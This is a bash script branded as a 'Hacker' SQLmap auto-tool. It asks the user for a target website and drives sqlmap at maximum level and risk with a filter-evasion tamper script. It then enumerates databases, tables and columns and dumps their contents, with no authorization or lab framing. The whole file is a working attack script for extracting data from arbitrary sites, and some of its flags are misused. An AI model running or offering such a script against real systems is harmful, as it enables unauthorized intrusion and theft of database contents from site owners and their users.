#!/bin/bash

trap 'printf "\n";stop;exit 1' 2


# Check if sqlmap is installed
if ! command -v sqlmap &> /dev/null; then
    echo "Error: sqlmap is not installed. Please install it first."
    exit 1
fi

apt install sqlmap
clear
# Function to print the banner
print_banner() {
# Define ANSI escape codes for colors
    local green="\033[1;32m"
    local blue="\033[1;34m"
    local reset="\033[0m"
echo  "**********************************************************************************************"
echo -e "${green}*                 WELCOME TO Hacker - SQLmap Advanced AutoTool    *${reset}"
echo "***********************************************************************************************"
echo "                            SSSSSSSSSSSSSSS      QQQQQQQQQ     LLLLLLLLLLL               iiii  "
echo "                          SS:::::::::::::::S   QQ:::::::::QQ   L:::::::::L              i::::i "
echo "                         S:::::SSSSSS::::::S QQ:::::::::::::QQ L:::::::::L               iiii  "
echo "                         S:::::S     SSSSSSSQ:::::::QQQ:::::::QLL:::::::LL                     "
echo "vvvvvvv           vvvvvvvS:::::S            Q::::::O   Q::::::Q  L:::::L               iiiiiii "
echo " v:::::v         v:::::v S:::::S            Q:::::O     Q:::::Q  L:::::L               i:::::i "
echo "  v:::::v       v:::::v   S::::SSSS         Q:::::O     Q:::::Q  L:::::L                i::::i "
echo "   v:::::v     v:::::v     SS::::::SSSSS    Q:::::O     Q:::::Q  L:::::L                i::::i "
echo "    v:::::v   v:::::v        SSS::::::::SS  Q:::::O     Q:::::Q  L:::::L                i::::i "
echo "     v:::::v v:::::v            SSSSSS::::S Q:::::O     Q:::::Q  L:::::L                i::::i "
echo "      v:::::v:::::v                  S:::::SQ:::::O  QQQQ:::::Q  L:::::L                i::::i "
echo "       v:::::::::v                   S:::::SQ::::::O Q::::::::Q  L:::::L         LLLLLL i::::i "
echo "        v:::::::v        SSSSSSS     S:::::SQ:::::::QQ::::::::QLL:::::::LLLLLLLLL:::::Li::::::i"
echo "         v:::::v         S::::::SSSSSS:::::S QQ::::::::::::::Q L::::::::::::::::::::::Li::::::i"
echo "          v:::v          S:::::::::::::::SS    QQ:::::::::::Q  L::::::::::::::::::::::Li::::::i"
echo "           vvv            SSSSSSSSSSSSSSS        QQQQQQQQ::::QQLLLLLLLLLLLLLLLLLLLLLLLLiiiiiiii"
echo "                                                         Q:::::Q"
echo "                                                          QQQQQQ"
    echo -e "${blue}---------------------------------visit www.github.com/hacksudo-----------------------------${reset}"
echo -e  "${green}-------------------------------- Author - Vishal Waghmare-----------------------------------${reset} "
echo -e "${blue} credit goes to sqlmap original tool https://github.com/sqlmapproject ${reset}"
}

print_banner


#Select option

# Define the options for the menu
# Function to execute action for each optio
# Define target URL
read -p 'Type Your Target Website: ' site

# Additional options for sqlmap (customize as needed)
options=" --batch --level=5 --risk=3 --threads=5  --tamper=space2comment"

sqlmap -g "$site" "$options"
# Run sqlmap
echo "Starting SQL injection testing with sqlmap..."
# Run  sqlmap find database 
sqlmap -u "$site"  --dbs 

# Define Database name
read -p	' Select Your Target database name: ' database
sqlmap -u "$site"  -D $database --tables

# Define Table name

read -p 'Select Your Target Table name: ' table
sqlmap -u "$site"  -D $database -T $table --columns

#Define  columns name 
read -p 'Select Your Column name:' column
sqlmap -u "$site"  -D $database -T $table  $column --dump
